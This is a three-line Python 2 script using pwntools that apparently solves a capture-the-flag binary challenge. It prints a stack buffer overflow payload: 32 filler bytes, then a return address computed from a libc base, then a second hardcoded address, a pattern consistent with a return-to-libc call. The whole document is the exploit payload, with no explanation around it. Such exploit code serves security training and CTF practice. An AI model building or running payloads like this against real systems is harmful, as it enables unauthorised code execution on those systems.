from pwn import *

print 'A'*32 + p32(0xf7e370a0-0x64da0+0x3fe70) + p32(0x804a02c)
